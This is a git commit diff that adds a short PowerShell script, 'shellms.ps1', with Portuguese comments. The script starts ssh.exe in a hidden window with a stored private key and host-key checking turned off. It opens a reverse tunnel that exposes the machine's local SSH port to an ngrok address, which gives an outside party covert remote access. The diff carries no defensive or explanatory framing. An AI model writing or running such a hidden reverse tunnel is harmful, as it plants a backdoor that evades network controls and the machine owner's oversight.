9981aa8f0ca661b3e5a12a8a18e627e0e8cc55fd
usermants <sanchezguy@proton.me>
2025-10-08 15:22:41 -0300

    Update shellms.ps1

--- shellms.ps1
+++ shellms.ps1
@@ -1,1 +1,12 @@
+# Caminho do SSH
+$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
+
+# Caminho da chave privada
+$keyPath = "C:\Users\Admin\.ssh\ssh_key"
+
+# Argumentos da conexão SSH
+$arguments = "-i `"$keyPath`" -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 3333:localhost:22 logosofico@0.tcp.sa.ngrok.io -p 13793 -N -vvv"
+
+# Executa o SSH de forma invisível
+Start-Process -FilePath $sshPath -ArgumentList $arguments -WindowStyle Hidden
 
